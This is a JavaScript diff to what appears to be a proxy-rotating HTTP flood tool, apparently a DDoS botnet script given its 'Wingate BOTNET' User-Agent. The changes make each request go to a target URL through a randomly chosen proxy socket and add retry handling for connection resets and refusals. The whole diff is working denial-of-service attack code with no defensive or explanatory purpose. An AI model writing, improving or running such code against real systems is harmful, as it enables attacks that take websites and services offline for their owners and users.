@@ -33,14 +33,34 @@ async function sendPacket(targetUrl, proxy, delay, kbSize, method) {
             }
 
             if (layer7[method]) {
-                layer7[method](info.socket, target, kbSize);
+                const req = http.request({
+                    host: target.hostname,
+                    port: target.port || 80,
+                    path: target.pathname,
+                    method: 'GET', 
+                    headers: {
+                        'User-Agent': 'Wingate BOTNET',
+                    },
+                    socket: info.socket, 
+                }, (res) => {
+                    console.log(`Packet sent to ${targetUrl} via ${proxy} with method ${method}`);
+                    resolve();
+                });
+
+                req.on('error', (err) => {
+                    if (err.code === 'ECONNRESET') {
+                        console.error(`Connection reset by ${proxy}. Retrying with another proxy...`);
+                    } else {
+                        console.error(`Error with ${proxy}: ${err.message}`);
+                    }
+                    reject(err);
+                });
+
+                req.end();
             } else {
                 console.error(`Method ${method} not found.`);
                 reject(new Error(`Method ${method} not found.`));
             }
-
-            console.log(`Packet sent to ${targetUrl} via ${proxy} with method ${method}`);
-            resolve();
         });
     });
 }
@@ -51,8 +71,8 @@ function start(targetUrl, delay, kbSize, method) {
         const proxy = proxyList[Math.floor(Math.random() * proxyList.length)];
 
         sendPacket(targetUrl, proxy, delay, kbSize, method).catch((err) => {
-            if (err.code === 'ECONNRESET') {
-                console.error(`Connection reset by ${proxy}. Retrying with another proxy...`);
+            if (err.code === 'ECONNRESET' || err.code === 'ECONNREFUSED') {
+                console.error(`Connection error with ${proxy}: ${err.message}`);
             } else {
                 console.error(`Error with ${proxy}: ${err.message}`);
             }
